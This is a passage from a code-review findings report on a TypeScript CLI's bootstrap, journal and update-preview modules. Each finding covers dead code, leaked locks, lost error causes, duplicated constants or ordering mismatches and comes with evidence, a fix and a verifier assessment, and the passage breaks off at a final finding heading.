**Verifier (confirmed).** Verified at tests/integration/brain-workflows/claude.test.ts:172. The only positive assertion is `expect(stdout).toMatch(/(DEV|INFRA|PROJECTS|TOOLS)\/example-[a-z-]+\.md/u)`. The brain-enhance prompt contains `DEV/example-knowledge-note.md` and `Read` is in --allowedTools, so an assistant reply that echoes or reads the path satisfies it without invoking the skill or running a `developer-os` Bash call. The write-scope check `added.every(...)` passes trivially when `added` is empty. Nothing parses the stream-json for a tool_use. The weakness is real but limited: only the brain-enhance case of the five puts a matching path in its prompt, and the lane runs by hand only. That makes it low severity, and it is not tracked by NEW-134.

### W2-BOOT-A-2 · dead-code · #preflightEvidence and #preflightReusableDirectories are written and cleared but never read

`apps/cli/src/bootstrap/executor.ts:523` · removal confidence: high

**Problem.** Both private maps are filled in planFreshInit, then deleted or cleared on every path, and no code ever calls get or has on them. They carry no behavior. They also make it look as though the post-lock re-inspection compares against a cached preflight, when it actually compares against the local evidenceBefore and reusableBefore.

**Evidence.**

```
`grep -rn 'preflightEvidence\|preflightReusableDirectories' apps/cli/src` returns only lines 523, 524 (declarations), 1449, 1450 (set), 1632, 1633, 1638, 1639 (delete) and 1710, 1711 (clear). Neither map has a get or has anywhere, and #-private fields cannot be reached from tests.
```

**Fix.** Delete both fields and their set, delete and clear calls (lines 523-524, 1449-1450, 1632-1633, 1638-1639, 1710-1711).

**Validation.** Typecheck and lint stay green; the bootstrap suite needs no change because nothing observed these maps.

**Verifier (confirmed).** A grep across apps, packages and tests finds only the declarations (523-524), the set calls (1449-1450), the delete calls (1632-1633, 1638-1639) and the clear calls (1710-1711). Nothing calls get or has on either field. Both are #-private, so no test can reach them. Removal is safe.

### W2-BOOT-A-3 · logic · ensureGlobalLock leaks the acquired global lock when reading the creation evidence throws anything other than ENOENT

`apps/cli/src/bootstrap/executor.ts:698`

**Problem.** The global lock is acquired at line 694 but stored in #heldLocks only at line 710. When readCreationEvidence throws a non-missing error, the error is rethrown without releasing `global`. That covers guardReadOwnedFile's securityRefusal on a changed evidence shape, a FreshBootstrapInterruption at before_creation_evidence_open, and a decodeCanonicalJson error. Because the lock never reached #heldLocks, neither executeFreshInit's finally nor close() can release it. Both arms that refuse on an evidence mismatch do release it, so this path is the odd one out.

**Evidence.**

```
`const global = await this.acquireLifecycleLock(planned.path); ... const evidence = retainedEvidence ?? await this.readCreationEvidence(plan, "ordinary", 0).catch((error: unknown) => { if (!isMissing(error)) throw error; return null; });` Lines 703 and 707 call `await global.handle.release().catch(() => undefined);` before throwing, but the rethrow at line 699 does not.
```

**Fix.** Put the evidence read and match in try/catch and call `await global.handle.release().catch(() => undefined)` before rethrowing. Alternatively, record `global` in #heldLocks right after acquiring it so that the finally block releases it.

**Validation.** Unit test: plant a creation-evidence file with mode 0644 for ordinal 0 of a plan that has passed after_global_lock. Run recovery and expect a securityRefusal, then check that a fresh lockProvider.acquire on state/.lifecycle.lock succeeds in the same process.

**Verifier (downgraded).** The leak is real. `global` is acquired at line 694 but stored in #heldLocks only at line 710, and the rethrow at line 699 skips the release that lines 703 and 707 perform. Impact is small, though. MacOsTransactionLockProvider is a lockf lock held on an fd, so the OS releases it when the process exits. The only production caller is commands/init.ts:975, which calls initializeFresh once per CLI process, and nothing retries in the same process. The leak therefore lasts only until exit. This is a consistency problem, not a lock left stuck across runs.

### W2-BOOT-A-4 · flow · A forward failure is replaced by any later error from compensate or retainTerminal

`apps/cli/src/bootstrap/executor.ts:1678`

**Problem.** In executeFreshInit's inner catch, compensate and retainTerminal run before `throw error`. If either throws, the user and the logs see only the secondary error, and the original cause is lost with no `cause` chain. The probe for W2-BOOT-A-1 shows this: the injected 'probe fail at after_first_payload' comes back as 'terminal retention lock reachability is unbound'. The project's error-handling rule requires keeping the cause chain.

**Evidence.**

```
`} catch (error) { if (error instanceof FreshBootstrapInterruption) throw error; const latest = store.current(); if (latest.manifestCursor < 2 && latest.terminalOutcome === null) { await this.compensate(plan, latest); await this.retainTerminal(plan, store, store.current()); } throw error; }`
```

**Fix.** Wrap compensation in try/catch. If it fails, throw a FreshBootstrapError (recoveryRequired) whose message names both failures and set `{ cause: error }` (FreshBootstrapError would need to accept and pass a cause), or attach the compensation error to the original.

**Validation.** In the W2-BOOT-A-1 regression (before the fix) or a fault-injected compensation, assert that the refusal message or its cause chain still contains the original failure point.

**Verifier (downgraded).** Confirmed. Lines 1674-1684 run compensate and retainTerminal before `throw error`, so a secondary error replaces the original one; probe run2 shows 'probe fail at after_first_payload' reported as 'reachability is unbound'. The impact is diagnostic only. The secondary error is a recoveryRequired FreshBootstrapError, and that exit code describes the on-disk state more accurately, since the envelope was not retained. In practice it shows up only together with W2-BOOT-A-1, or when compensation itself fails.

### W2-BOOT-A-5 · inconsistency · The preview of a resumed plan always reports unchanged: [], which drops an existing Brain the new-plan preview and the outcome both report

`apps/cli/src/bootstrap/executor.ts:763`

**Problem.** previewNewFreshInit (line 784) and completedOutcome (line 1724) report `unchanged: [brainPath]` when the Brain was not created by the plan. previewFreshInit for a resumed plan returns `unchanged: []` and takes `created` from the manifest artifacts, so an existing Brain appears in neither list. The dry-run output of `init` (commands/init.ts:1009) therefore differs between a fresh plan and a resumed one for the same home.

**Evidence.**

```
lines 758-764: `return { schemaVersion: 2, productHome: ..., brainPath: retainedRequest.brainPath, created: manifest.artifacts.map((artifact) => artifact.path), unchanged: [], };` against line 1724: `unchanged: brainCreated ? [] : [request.brainPath],`
```

**Fix.** Derive unchanged the way completedOutcome does: `const brainCreated = manifest.artifacts.some((a) => a.path === retainedRequest.brainPath); unchanged: brainCreated ? [] : [retainedRequest.brainPath]`.

**Validation.** Run init --dry-run over an interrupted plan whose Brain already existed; expect unchanged to contain the Brain path.

**Verifier (confirmed).** Lines 758-764 return `unchanged: []` for a resumed plan, while previewNewFreshInit (line 784) and completedOutcome (line 1724) put brainPath into unchanged when the plan did not create the Brain. commands/init.ts:959 passes the preview straight to the dry-run result and to describeFreshPreview in the confirm prompt, so the difference is visible to the user. No test pins `unchanged: []` for a resumed preview.

### W2-BOOT-A-6 · dead-code · The previewPaths Brain entry repeats config.brainPath through a ternary that always yields the same value

`apps/cli/src/bootstrap/executor.ts:1752` · removal confidence: high

**Problem.** `request.config.brainPath === request.brainPath ? request.brainPath : request.config.brainPath` evaluates to request.config.brainPath in both branches, so it adds nothing to the Set after line 1751. If the intent was to list request.brainPath when it differs from config.brainPath, the code never does that. In production the two are always equal (commands/init.ts:958 `{ config, brainPath: config.brainPath }`).

**Evidence.**

```
lines 1751-1752: `request.config.brainPath,` / `request.config.brainPath === request.brainPath ? request.brainPath : request.config.brainPath,`
```

**Fix.** Replace both lines with `request.brainPath` (the path the Brain files at line 1742 actually use), or delete line 1752.

**Validation.** Preview path lists stay the same in the existing init tests, because the paths are equal in production.

**Verifier (confirmed).** Line 1752 evaluates to request.config.brainPath on both branches of the ternary and repeats line 1751 inside a Set, so it adds nothing. Production always passes `{ config, brainPath: config.brainPath }` (init.ts:958), so the two paths are equal. Removing the line changes nothing.

### W2-BOOT-A-7 · inconsistency · acquireLifecycleLock's catch-all rewrites an invalid handle and every provider error into 'lock is unavailable'

`apps/cli/src/bootstrap/executor.ts:574`

**Problem.** The bare `catch` also catches the FreshBootstrapError thrown three lines above for a handle without release(), and it maps every provider failure (for example EACCES, or a provider-side shape or security refusal) to recoveryRequired 'a lifecycle bootstrap lock is unavailable', with no cause attached. A live holder and a tampered lock file produce the same diagnosis and the same exit code.

**Evidence.**

```
`} catch { throw new FreshBootstrapError(EXIT_CODES.recoveryRequired, "a lifecycle bootstrap lock is unavailable"); }` wraps `throw new FreshBootstrapError(EXIT_CODES.recoveryRequired, "a lifecycle lock handle is invalid");`
```

**Fix.** Rethrow a FreshBootstrapError unchanged, and map only the provider's contention error to 'unavailable', passing `{ cause }` along.

**Validation.** Unit test with a lockProvider stub that returns {} and expect the 'handle is invalid' message; a stub that throws EACCES should not report 'unavailable'.

**Verifier (confirmed).** Confirmed in the code. The bare `catch` at line 574 also swallows the 'handle is invalid' FreshBootstrapError thrown inside the try. It also maps both MacOsTransactionLockUnavailableError and MacOsTransactionLockOperationalError to 'a lifecycle bootstrap lock is unavailable', with no cause attached. The exit code is recoveryRequired in every case, and the production provider always returns a valid handle, so this is a diagnostic inconsistency only.

### W2-BOOT-B-4 · flow · Resuming a compensation from the payload stage requires a readable packaged release, outside the compensating catch

`apps/cli/src/bootstrap/executor.ts:1664`

**Problem.** (Outside the assigned range; I reached it while tracing how compensate is resumed.) executeFreshInit calls inspectPackagedRelease whenever nextPayload < plan.payloads.length, including for a journal already in phase "compensating". The call sits before the inner try whose catch runs compensate(). If the packaged release was removed or changed after the failed init, which is a likely user action after a failure, the inspection throws, compensate() never runs, and the rollback cannot be resumed until the original package is restored. Compensation never reads package bytes.

**Evidence.**

```
const packaged = journal.nextPayload < plan.payloads.length
        ? await inspectPackagedRelease(this.#dependencies.packagedRelease)
        : null;
      try {
        journal = await this.stagePayloads(plan, journal, packaged);
```

**Fix.** Inspect the packaged release only when journal.direction === "forward" (or phase is planned or payload_staging), or move the call inside the try block so its failure routes to compensate().

**Validation.** Add a test: fail at during_payload_write, interrupt at a compensation death point, delete the packaged release, rerun init. Expect rollback to complete (terminalOutcome rolled_back) instead of a packaged-release error.

**Verifier (downgraded).** The code matches. inspectPackagedRelease (1666-1668) runs outside the inner try for any journal with nextPayload < payloads.length, compensating journals included, and compensate never reads package bytes (sourceBytes is reached only from stagePayloads). In practice, though, the packaged release is the installed CLI that is running this code, so it is almost always readable when init is re-run. An upgrade in between also does not break it, because the inspection only admits the release and does not compare it to the plan hashes. Real but low impact.

### W2-BOOT-B-5 · duplication · compensate() re-implements core's reachedReversibleSteps formula

`apps/cli/src/bootstrap/executor.ts:3657`

**Problem.** The executor recomputes the reversible-step count inline. The core grammar validates the forward->compensating transition against its own private copy, reachedReversibleSteps (bootstrap-retention.ts:453), and requires compensationNext === that value - 1. The two copies must stay byte-for-byte equivalent. Any change to one (for example a new cursor) makes every rollback refuse its first journal advance.

**Evidence.**

```
const reached =
      journal.nextPayload +
      (journal.payloadWriteState.state === "idle" ? 0 : 1) +
      journal.nextCreatedPath +
      journal.nextFoundationParticipant +
      journal.nextLaunchabilityPath +
      Math.min(journal.manifestCursor, 1);
core: `function reachedReversibleSteps(journal) { return journal.nextPayload + (journal.payloadWriteState.state === "idle" ? 0 : 1) + journal.nextCreatedPath + journal.nextFoundationParticipant + journal.nextLaunchabilityPath + Math.min(journal.manifestCursor, 1); }`
```

**Fix.** Export reachedReversibleSteps from @developer-os/core (manifest index) and call it here.

**Validation.** Typecheck passes and the existing rollback tests (during_payload_write, after_foundation) still reach rolled_back.

**Verifier (confirmed).** Verified. executor.ts:3657-3663 matches core's private reachedReversibleSteps (bootstrap-retention.ts:453) term for term, the core copy is not exported (grep shows only internal uses at 514 and 741), and the forward-to-compensating grammar at 740-741 requires compensationNext === reachedReversibleSteps(current) - 1. The two copies are coupled and duplicated, but in sync today. Low.

### W2-BOOT-B-6 · inconsistency · Forward Foundation path emits a 'foundation:compensation:' trace for a participant it never executes, and a test pins the order

`apps/cli/src/bootstrap/executor.ts:3442`

**Problem.** applyFoundation traces foundation:compensation:<id> and then executes only the forward participant. The compensation participant runs only in compensate(), which emits its own foundation:compensation:apply: trace. executor.test.ts:201 asserts index("foundation:compensation:") < index("foundation:forward:"), which checks the order of a label, not of any real event. The test would still pass if the compensation journal were never prepared.

**Evidence.**

```
this.trace(`foundation:compensation:${compensation.id}`);
      const admitted = await this.admittedFoundation(forward, plan);
      await this.#dependencies.transactionExecutor.executeBootstrapFoundationParticipant(admitted);
      this.trace(`foundation:forward:${forward.id}`);
test: expect(index("foundation:compensation:")).toBeLessThan(index("foundation:forward:"));
```

**Fix.** Remove the misleading trace, or rename it to something that describes what really happens (e.g. foundation:pair:<compensationId>). Update the test to assert a real effect, for example that the compensation participant's initial journal payload stays staged and unpublished after forward.

**Validation.** The happy-path init test asserts the corrected trace, and no trace says 'compensation' unless compensate() ran.

**Verifier (confirmed).** Verified. applyFoundation (3442) emits foundation:compensation:<id> and then runs only the forward participant. The compensation participant runs only in compensate (3682), which emits its own :apply: trace. The test assertion at executor.test.ts:201 only checks the order of two trace() calls that sit next to each other in the same function, so it proves nothing about compensation preparation. A misleading label plus a tautological test. Low.

### W2-BOOT-B-7 · inconsistency · Bare catch blocks drop the cause of retention and plan-admission failures

`apps/cli/src/bootstrap/executor.ts:3794`

**Problem.** retainTerminal and admitPersistedPlanStructure catch every error and rethrow a generic FreshBootstrapError without `cause`. Retention is the step operators must debug when a rollback is stuck (see W2-BOOT-B-1..3), and the original refusal (which evidence or which table row) is lost. This breaks the repository's error-handling rule to preserve the cause chain.

**Evidence.**

```
} catch {
      throw new FreshBootstrapError(
        EXIT_CODES.recoveryRequired,
        `retention ${stage} failed`,
      );
    }
(and line 2641: `} catch {
      throw new FreshBootstrapError(EXIT_CODES.securityRefusal, "persisted bootstrap plan failed structural grammar admission");`)
```

**Fix.** Bind the error and pass `{ cause: error }`, if the FreshBootstrapError constructor accepts options; otherwise extend it to accept them.

**Validation.** A unit test that forces deriveBootstrapRetentionTable to refuse sees error.cause set to the core refusal.

**Verifier (confirmed).** Verified. Both catches are bare: 3794 in retainTerminal and 2641 in admitPersistedPlanStructure. The FreshBootstrapError constructor (205-213) takes no cause option, so the cause cannot be kept today. Diagnostic value is partial: core refusals mostly use a generic message (refuse() at bootstrap-retention.ts:290), but buildRetentionEvidence I/O errors would carry real detail. The file has 7 bare catches in total, so this is a pattern rather than a one-off. Low.

### W2-BOOT-C-1 · logic · Report marks an envelope resumable when slot 1 has bytes, but the journal store refuses to resume it

`apps/cli/src/bootstrap/report.ts:1078` · related: NEW-83, NEW-123

**Problem.** inspectPlan classes a slotless envelope as resumable ('incomplete', active {plan, journal: null}) when both slot values decode to null and the leaf identity matches. It never checks that slot 1 is empty: a non-empty slot 1 that does not decode also gives null. BootstrapJournalStore.open only falls back to the initial write when raw[1].byteLength === 0; otherwise it rethrows the selection error. On such a home, every ordinary command throws resumeWithInit() ('must be resumed by init'), and init fails in storeFor -> BootstrapJournalStore.open. The user is stuck in a loop, and §6.4 would class this envelope as unverified residue, not resumable authority.

**Evidence.**

```
report.ts:1078-1079 `const resumable = slotValues.every((candidate) => candidate === null) &&
      bootstrapLeaf !== null && identityMatches(bootstrapLeaf, plan.bootstrapIdentity);` (slotValues come from report.ts:992-996, where undecodable bytes become `null`). journal-store.ts:791-793 `if (raw[1].byteLength !== 0 || observed[0] !== null || observed[1] !== null) {
          throw asError(selectionError);
        }`. report.ts:1717-1723 then throws resumeWithInit() because active.journal is null.
```

**Fix.** Bind the report to the store's rule. Make `resumable` also require the slot-1 entry's `bytes === "0"`, e.g. `slotValues.every(v => v === null) && initial.find(e => e.path === plan.journalSlots[1].path)?.bytes === "0" && ...leaf check`. Better still, export one predicate from journal-store.ts (`initialWriteAdmissible(raw0Len, raw1Len, observed)`) and use it in both places.

**Validation.** Fixture: a published plan, an exact bootstrap leaf, slot 0 empty, and slot 1 holding a few non-canonical bytes ('{'). Before the fix, inspectBootstrapEvidenceAdmission returns active {journal: null} with status 'incomplete', and executor init fails in BootstrapJournalStore.open. After the fix, the envelope reads 'unverified' with blocksNewIntent decided by restoredTargets, and no resume loop occurs.

**Verifier (downgraded).** The code matches. report.ts:1078 never checks the slot-1 byte length, and journal-store.ts:791 refuses unless raw[1].byteLength === 0, so the two rules really do diverge. The store's own writes cannot reach this state, though. The initial write goes only to slot 0 (journal-store.ts:799). advance() always writes the inactive slot while the current slot stays a valid record (journal-store.ts:860-872), so slot 1 never holds bytes unless slot 0 holds a decodable record. 'Both slots null with slot 1 non-empty' therefore needs outside tampering or disk corruption. The result fails closed: a refusal loop with no data loss. threat-model.md:711 already accepts slot corruption as a known limitation. A valid low-severity consistency fix, not medium.

### W2-BOOT-C-2 · duplication · Terminal-journal reconstruction exists three times with different sequence guards

`apps/cli/src/bootstrap/report.ts:397`

**Problem.** report.ts terminalJournal, BootstrapExecutor.terminalJournal and core reconstructRetentionTerminal each derive the terminal record from a retaining/retained journal. Report and core accept a terminal at sequence 0 (`< 0n`). The executor refuses it with recoveryRequired (`< 1n`). Inspection and the executor therefore disagree on whether such a record has a terminal: the report builds retention evidence for it, and the executor throws. Any future change to the preimage layout must be made three times.

**Evidence.**

```
report.ts:404-405 `const sequence = BigInt(current.sequence) - BigInt(current.retentionNext) - 1n;
  if (sequence < 0n) return null;`; executor.ts:851-854 `const terminalSequence = BigInt(current.sequence) - BigInt(current.retentionNext) - 1n;
    if (terminalSequence < 1n) {
      throw new FreshBootstrapError(EXIT_CODES.recoveryRequired, ...`; packages/core/src/manifest/bootstrap-retention.ts:1357-1359 `const terminalSequence = BigInt(journal.sequence) - sequenceOffset;
  if (terminalSequence < 0n) return refuse();`
```

**Fix.** Export one reconstruction from core, for example a non-throwing `deriveBootstrapTerminalJournal(journal): BootstrapJournalRecordV1 | null` wrapping reconstructRetentionTerminal. Use it in report.ts and executor.ts, with a single guard (`< 1n`: sequence 0 is always 'planned').

**Validation.** Unit test: a 'retained' record whose sequence equals retentionNext + 1. Every caller gives the same answer, null/refused. grep shows a single `- BigInt(...retentionNext) - 1n` site.

**Verifier (confirmed).** Verified three near-identical reconstructions: report.ts:397-416, executor.ts:841-863 and core bootstrap-retention.ts:1347-1367. The guards differ as quoted (<0n, <1n, <0n). The claimed behavioral split is not shown to be reachable: core then runs the sequence-0 terminal through validateJournalRecord, and selection validation upstream of report/executor goes through core. Keep it as a duplication/maintenance finding only.

### W2-BOOT-C-3 · dead-code · ManagedDriftError is exported but never constructed, imported or tested

`apps/cli/src/bootstrap/report.ts:228` · removal confidence: high

**Problem.** The class is exported from report.ts, but nothing in the repository references it. It suggests a drift-refusal path (exit decisionRequired) that does not exist.

**Evidence.**

```
`git grep -n "ManagedDriftError"` returns only report.ts:228 `export class ManagedDriftError extends Error {` and report.ts:233 `this.name = "ManagedDriftError";`.
```

**Fix.** Delete report.ts:228-235.

**Validation.** pnpm typecheck and lint stay green. `git grep ManagedDriftError` returns nothing.

**Verifier (confirmed).** `git grep -n ManagedDriftError` matches only report.ts:228 and :233 in the whole repository: no construction, import, test or doc. Safe to delete.

### W2-BOOT-C-4 · dead-code · assertCombinedBootstrapCapacity re-checks caps that assertBootstrapRetentionCapacity already enforces

`apps/cli/src/bootstrap/report.ts:1598` · removal confidence: high

**Problem.** The call just above already refuses ids > BOOTSTRAP_RETAINED_MAX_IDS, entries > BOOTSTRAP_RETAINED_MAX_ENTRIES and bytes > BOOTSTRAP_RETAINED_MAX_REGULAR_BYTES: `integer()` refuses above its maximum, and the bytes check refuses explicitly. The second `if` can never be true, so its distinct error message never surfaces.

**Evidence.**

```
report.ts:1593-1602 calls `assertBootstrapRetentionCapacity({ ids: ..., entries: ..., bytes: ... })` and then `if (aggregate.idCount + projected.idCount > BOOTSTRAP_RETAINED_MAX_IDS || ... > BOOTSTRAP_RETAINED_MAX_ENTRIES || ... > BOOTSTRAP_RETAINED_MAX_REGULAR_BYTES) throw new Error(...)`. Core bootstrap-retention.ts:2094-2098: `const ids = integer(value.ids, 0, BOOTSTRAP_RETAINED_MAX_IDS); const entries = integer(value.entries, 0, BOOTSTRAP_RETAINED_MAX_ENTRIES); ... if (parsedBytes > MAX_UINT64 || parsedBytes > BOOTSTRAP_RETAINED_MAX_REGULAR_BYTES) return refuse(...)`, where `integer` refuses when `value > maximum`.
```

**Fix.** Delete the second `if` block (report.ts:1598-1602) and the three now-unused cap imports. Both executor call sites already map any throw to their own recovery error.

**Validation.** Typecheck and lint stay green. The executor capacity tests still refuse at each cap.

**Verifier (confirmed).** core assertBootstrapRetentionCapacity (bootstrap-retention.ts:2093-2100) already refuses ids > MAX_IDS and entries > MAX_ENTRIES via integer(), whose check is `value > maximum` -> refuse, and bytes > MAX_REGULAR_BYTES explicitly. The same sums are passed in, so the second `if` at report.ts:1598-1602 can never fire. Both callers (executor.ts:1415 and 1573) catch the error and replace it with their own message, so dropping it changes nothing. Not in known.json (CORE-UPD-3 is a different file).

### W2-BOOT-C-5 · inconsistency · The ordinary-command gate swallows every error per envelope, including code defects

`apps/cli/src/bootstrap/report.ts:1635` · related: NEW-92, NEW-140

**Problem.** readPlanEnvelopes catches everything from readBootstrapEnvelope and skips that envelope. It also turns any listNames failure into an empty list, not only ENOENT. This runs on the V2 path of assertOrdinaryCommandAdmitted, so a TypeError or RangeError in slot reading or validateSlots silently admits the command, even past a non-terminal envelope whose handoff is intact. The sibling helpers in this file rethrow defects (exactV2Handoff and supersededV2Handoff use isCodeDefect, guardedFile rethrows TypeError/RangeError/ReferenceError), as does the NEW-92 convention.

**Evidence.**

```
report.ts:1621-1625 `try {
    names = await request.listNames(request.stateDirectory);
  } catch {
    return [];
  }`; report.ts:1632-1637 `try {
      const envelope = await readBootstrapEnvelope(request, planEntry.entry, publishedManifestHash);
      if (envelope !== null) envelopes.push(envelope);
    } catch {
      continue;
    }`; compare report.ts:789-791 `} catch (error) {
    if (isCodeDefect(error)) throw error;
    return null;`
```

**Fix.** In both catches, rethrow when `isCodeDefect(error)`. Return [] from listNames only for ENOENT and rethrow any other errno, so an unreadable state directory reaches the existing BootstrapRecoveryRequiredError handling instead of admitting the command.

**Validation.** Add a report.defect.test.ts case: a reader whose readRegularFile throws a TypeError for a slot of a non-terminal envelope whose manifest hash matches. assertOrdinaryCommandAdmitted must reject with TypeError and must not resolve. A listNames that throws EACCES must not resolve either.

**Verifier (downgraded).** The code matches report.ts:1621-1625 and 1632-1637. The errno half is intended, not a defect: threat-model.md:711 says that with a valid V2 manifest the gate 'refuses only a readable non-terminal journal' and admits a plan that no longer admits, so an unreadable directory or envelope is admitted by declared policy. What remains is narrower: a TypeError/RangeError code defect is swallowed. That breaks the NEW-92 convention the same file follows at report.ts:790/822. Keep only the isCodeDefect rethrow; drop the ENOENT-only listNames change.

### W2-BOOT-C-7 · duplication · Plan and journal byte caps are hard-coded in three CLI files instead of one shared constant

`apps/cli/src/bootstrap/journal-store.ts:24`

**Problem.** MAX_PLAN_BYTES and MAX_JOURNAL_BYTES are declared separately in journal-store.ts, report.ts and executor.ts. admitBootstrapEvidencePlan pins `maximumPlanBytes === MAX_PLAN_BYTES` against report.ts's copy, while the store bounds reads with its own copy. Changing one without the others makes the store and the report disagree on which plans are admissible.

**Evidence.**

```
journal-store.ts:24-25 `const MAX_PLAN_BYTES = 268_435_456;
const MAX_JOURNAL_BYTES = 1_048_576;`; report.ts:59-60 has the same two lines, and executor.ts:104-105 has them a third time.
```

**Fix.** Export both constants once, from core next to BOOTSTRAP_RETAINED_* or from a small bootstrap/limits.ts, and import them in all three files.

**Validation.** `grep -rn "268_435_456" apps/cli/src` finds a single definition. Typecheck stays green.

**Verifier (confirmed).** Verified MAX_PLAN_BYTES = 268_435_456 / MAX_JOURNAL_BYTES = 1_048_576 at journal-store.ts:24-25, report.ts:59-60 and executor.ts:104-105, with a fourth unexported copy at packages/core/src/manifest/bootstrap.ts:38. Core does not export it, so the fix should export the core constant. This is the same class as known CLI-UPD-3, but for different constants and files, so it is not a duplicate.

### W2-BUNDLE-1 · inconsistency · The public preview orders migration domains brain-first, while execution and the inverse leaves in the same file use product_state-first

`packages/core/src/update/preview.ts:244`

**Problem.** buildMigrationPreviews sorts the user-visible and hashed preview migrations by a local MIGRATION_DOMAIN_ORDER of brain then product_state. Execution and rollback use the canonical SCHEMA_MIGRATION_DOMAIN_ORDER of product_state then brain: migration-planning orderMigrationChain, rollback.ts:716, and buildPreparedUpdateMaterialization in this same file at line 506. So the preview lists brain migrations before product_state, but apply runs product_state first. The docstring at 343-346 says the canonical order is 'domain, then ascending chain position', yet two different domain orders exist in the file. previewHash binds the brain-first order, so the hash cannot be recomputed from the canonical constant.

**Evidence.**

```
preview.ts:244 `const MIGRATION_DOMAIN_ORDER: readonly SchemaMigrationPreviewV1["domain"][] = ["brain", "product_state"];`
preview.ts:350 `MIGRATION_DOMAIN_ORDER.indexOf(left.domain) - MIGRATION_DOMAIN_ORDER.indexOf(right.domain) || left.fromVersion - right.fromVersion`
preview.ts:506 `... : SCHEMA_MIGRATION_DOMAIN_ORDER.indexOf(fields?.domain as SchemaMigrationDomainV1);`
migration-planning.ts:24 `export const SCHEMA_MIGRATION_DOMAIN_ORDER ... = Object.freeze(["product_state", "brain"]);`
The built dist has the same split: dist/update/preview.js:10 `["brain", "product_state"]` and dist/update/migration-planning.js:9 `["product_state", "brain"]`. preview.ts:243 OWNER_ORDER also restates owner.ts:19 OWNER_UPDATE_ORDER (and planner.ts:277 restates it again).
```

**Fix.** Delete MIGRATION_DOMAIN_ORDER and OWNER_ORDER from preview.ts. Use SCHEMA_MIGRATION_DOMAIN_ORDER (already imported) for the domain check and the sort, and import OWNER_UPDATE_ORDER from owner.ts. This changes previewHash for any update or rollback that has migrations in both domains, so treat it as a preview-protocol change and record a decision.

**Validation.** Add a preview.test.ts case with one brain migration and one product_state migration. Assert that buildUpdatePreview(...).migrations[0].domain === 'product_state' and that this matches the order of the schema_migration_inverse leaves from buildPreparedUpdateMaterialization.

**Verifier (downgraded).** The code matches the finding. preview.ts:244 orders brain first and uses that order at :329 and :350. migration-planning.ts:24, rollback.ts:716 and preview.ts:506 use product_state first, and the spec says 'Migrations are product-state before Brain' (release-update design line 4916). The cost is limited to what the user sees. previewHash is computed and checked by the same function, nothing external recomputes it, and the order of the preview list does not drive execution. The user-facing preview simply lists migrations in a different order from the one apply uses. preview.test.ts:203 deliberately pins the brain-first order (['migration_brain-v2','migration_brain-v3','migration_state-v3']), so a fix needs that test changed and a preview-hash decision. No BACKLOG row tracks this. The OWNER_ORDER restatement is a minor side point.

### W2-BUNDLE-2 · duplication · Bundle-entry validation and its bounds are reimplemented beside release.ts validateBundleManifest

`packages/core/src/update/bundle-participant.ts:472`

**Problem.** validateBundleEntries repeats the entry rules that release.ts validateBundleManifest already enforces on the same ReleaseBundleEntryV1 rows: UTF-8 order, exact plus NFC/en-US case-fold uniqueness, parent-before-child, a 512 MiB per-file cap, an 8 GiB aggregate cap, and a 200k entry cap. validateTarget (920-932) likewise repeats release.ts validateIdentity's key list and scalar checks. The same bounds appear as literals in four more places. If one copy changes, a bundle the release verifier admits could be refused by the participant plan, or the reverse.

**Evidence.**

```
bundle-participant.ts:498 `const folded = path.normalize("NFC").toLocaleLowerCase("en-US");` and :499 `if (seen.has(path) || seen.has(folded) || (prior !== null && compareUtf8(prior, path) >= 0)) fail(...)`
release.ts:429 `if (seen.has(current.path) || seen.has(current.path.normalize("NFC").toLocaleLowerCase("en-US")) || (prior !== undefined && compareUtf8(prior.path, current.path) >= 0)) invalid(...)`
The bounds are restated at release.ts:205-206 (`536_870_912n`, `8_589_934_592n`), release.ts:426 (`200_000`), bundle-participant.ts:321-325, preview.ts:255 (`8n * 1024n ** 3n`) and :428 (`200_000`), and apps/cli/src/update/packaged-release.ts:17-18. The exported MAXIMUM_BUNDLE_ENTRIES and MAXIMUM_BUNDLE_FILE_BYTES have no production importer outside bundle-participant.ts.
```

**Fix.** Export one entry-list validator from release.ts and the bound constants. Have bundle-participant's validateBundleEntries delegate to it, and replace the preview.ts and packaged-release.ts literals with the exported constants.

**Validation.** Typecheck. Run the existing release.test.ts and bundle-participant tests unchanged. Grep for `200_000` and `536_870_912` under update/ to confirm one definition each.

**Verifier (confirmed).** Verified. bundle-participant.ts:472-506 validateBundleEntries and release.ts:425-434 validateBundleManifest/validateBundleEntry enforce the same rules: UTF-8 order, exact plus NFC/en-US folded uniqueness, parent-before-child, a 512 MiB per-file cap, an 8 GiB aggregate cap and a 200k entry cap. The bounds are separate literals: release.ts:205-206 and 426, and bundle-participant.ts:320-324. The two copies agree today, so the risk is only that they drift apart later. This is distinct from known CORE-UPD-1 (hash helper) and CORE-UPD-4 (primitive helpers), because the duplication here is in the domain rules.

### W2-BUNDLE-3 · dead-code · The owner-preview partition checks can never fire, because both production callers build the partition from the four path arrays

`packages/core/src/update/preview.ts:300` · removal confidence: medium

**Problem.** The OwnerUpdatePreviewInputV1.partition docstring describes an independently supplied 'complete current-plus-created path set' that the four arrays must partition. Both production callers pass the concatenation of the four arrays as the partition. In production, the 'not disjoint', 'outside the owner partition' and 'partition not covered' branches are therefore unreachable. Any overlap fails earlier as 'partition: duplicate', so coverage is not checked against an independent source. Only preview.test.ts:191 exercises these branches, using a synthetic partition.

**Evidence.**

```
planner.ts:1218 `partition: [...paths.create, ...paths.replace, ...paths.remove, ...paths.unchanged]`
planning.ts:781 `partition: [...paths.create, ...paths.replace, ...paths.remove, ...paths.unchanged],`
preview.ts:300 `if (!partition.has(path)) fail("OwnerUpdatePreviewV1.paths: outside the owner partition");` and :305 `if (seen.size !== partition.size) fail(... "partition not covered");`
```

**Fix.** Option A: have the callers pass the real current-plus-created set (planner: plan.currentArtifacts token paths plus creates; rollback: manifest owner rows plus restored paths) so the check has meaning. Option B: drop the partition field and these three checks and rely on the per-class sortedUnique plus a cross-class disjointness check.

**Validation.** Option A: add a planner test where a replace token is missing from currentArtifacts and expect a refusal. Option B: confirm the existing preview tests that still apply pass.

**Verifier (confirmed).** Verified. planner.ts:1218 and apps/cli/src/update/planning.ts:781 both pass partition as the concatenation of the four path arrays. Those are the only production callers; a grep for 'partition:' finds no other. Any overlap therefore fails first in sortedUnique on the partition ('partition: duplicate'). The 'not disjoint' check (:299), the 'outside the owner partition' check (:300) and the 'partition not covered' check (:305) cannot fire in production, which contradicts the docstring at :199 describing an independent current-plus-created set. The impact is a check that guards nothing; there is no wrong output.

### W2-BUNDLE-5 · dead-code · SafeRenderedPathV1 is exported, but nothing produces or consumes it

